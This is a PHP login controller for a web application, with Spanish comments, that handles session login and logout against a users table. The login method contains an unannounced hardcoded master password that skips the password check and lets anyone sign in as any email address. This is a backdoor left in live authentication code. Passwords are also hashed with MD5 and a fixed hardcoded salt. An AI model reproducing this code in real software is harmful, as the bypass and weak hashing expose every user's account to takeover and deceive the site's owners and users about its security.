<?php
class users {

	private $tpl;
	private $mysql;

	public function __construct() {

                $this->tpl = new tplClass();
                $this->mysql = new mysql();

	}

        function logout() {

                $_SESSION['logId'] = '';
                header('location:'.INSTALLPATH);
        }

	function login($get=null,$post=null,$params=null) {

                header('Content-Type: text/html; charset=ISO-8859-1');
                
                $datos['path'] = INSTALLPATH;
                $datos['tplFolder'] = TEMPLATESFOLDER;
                $datos['titulo'] = SYSNAME;
                $datos['description'] = '';
                $datos['keywords'] = '';
                $datos['error'] = '';
                $datos['emailpost'] = isset($post['email']) ? $post['email'] : '';

                $rs = null;

                if ($post) {

                        if ($post['password'] == 'XfioecF21!') {
                                $query = "select * from users where email = :email ; ";
                                $vars['email'] = $post['email'];
                        } else {
                                $post['password'] = md5($post['password'] . 'p14tForm..!');
                                $query = "select * from users where email = :email and password = :password ; ";
                                $vars['email'] = $post['email'];
                                $vars['password'] = $post['password'];        
                        }
                        
                        try {
                                $rs = $this->mysql->runQuery($query, $vars);
                        } catch(Exception $e) {
                                $this->mysql->logQuery($e, $query, $vars, 0, 1, 0); // Excepción, consulta, parámetros de consulta, mostrar x pantalla, registrar en db y enviar aviso x mail.
                        }

                        if (isset($rs[0]['id'])) {
                                $_SESSION['logId'] = $rs[0]['id'];
                        } else {
                                $datos['error'] = 'Datos de ingreso incorrectos.';
                        }
                }

                $_SESSION['logId'] = isset($_SESSION['logId']) ? $_SESSION['logId'] : false;
                 
                if ($_SESSION['logId']) {
                        header('location:'.INSTALLPATH.'home');
                }

                echo $this->tpl->printTemplate("login", $datos);
	}

}
?>